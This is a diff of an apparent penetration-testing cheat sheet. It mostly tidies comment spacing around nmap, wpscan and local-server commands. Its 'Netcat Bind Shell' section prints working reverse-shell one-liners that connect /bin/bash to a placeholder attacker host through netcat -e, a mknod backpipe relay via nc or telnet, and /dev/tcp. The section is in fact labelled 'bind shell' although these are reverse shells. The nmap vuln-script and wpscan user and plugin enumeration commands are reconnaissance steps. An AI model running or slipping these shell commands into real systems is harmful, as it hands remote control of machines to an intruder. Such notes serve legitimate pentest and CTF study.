@@ -1,20 +1,20 @@
 # **Basic Scanning Tools & Techniques**
 **1. Nmap**
 ```
-a. nmap -sC -sV -vv -Pn -p 1-65535 <ip>				#Default_Script#Service version#Verbose#Skip host discovery#port
-b. nmap -O <ip>											#Operating System
+a. nmap -sC -sV -vv -Pn -p 1-65535 <ip>	#Default_Script#Service version#Verbose#Skip host discovery#port
+b. nmap -O <ip>	#Operating System
 c. nmap -A <ip>
 d. nmap -ssC -sV -vv <ip>
 e. nmap -sC --script=smb-enum-users <IP>
-f. nmap -T4 --script vuln <ip>							#Awesome#T-Timing(5-high-Fast, 0-low-slow)
+f. nmap -T4 --script vuln <ip>	#Awesome#T-Timing(5-high-Fast, 0-low-slow)
 ```
 
 **2. Wpscan**
 ```
 a. wpscan --url <url> --enumerate p
 b. wpscan -u <url> --disable-tls-checks --enumerate ap
-c. wpscan --disable-tls-checks --url <url> --enumerate u		#User
-d. wpscan --disable-tls-checks --url <url> --enumerate p		#Plugin
+c. wpscan --disable-tls-checks --url <url> --enumerate u	#User
+d. wpscan --disable-tls-checks --url <url> --enumerate p 	#Plugin
 ```
 
 **3. Create Server**
@@ -27,8 +27,8 @@ c. php -S <localhost:port>
 ```
 # Netcat Bind Shell
 a. nc <attacker_ip> <port> -e /bin/bash
-# When you don't have access to -e option of Netcat
-b. When the GAPING_SECURITY_HOLE is disabled, which means you don't have access to the '-e' option of netcat.Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? The following image should clear things up.
+#  When the GAPING_SECURITY_HOLE is disabled, meaning you don't have access to -e option of Netcat.
+# Create a FIFO file system object and use it as a backpipe to relay standard output from commands piped from netcat to /bin/bash back into netcat. Sounds confusing right? 
 	1. mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
 c. /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
 d. mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
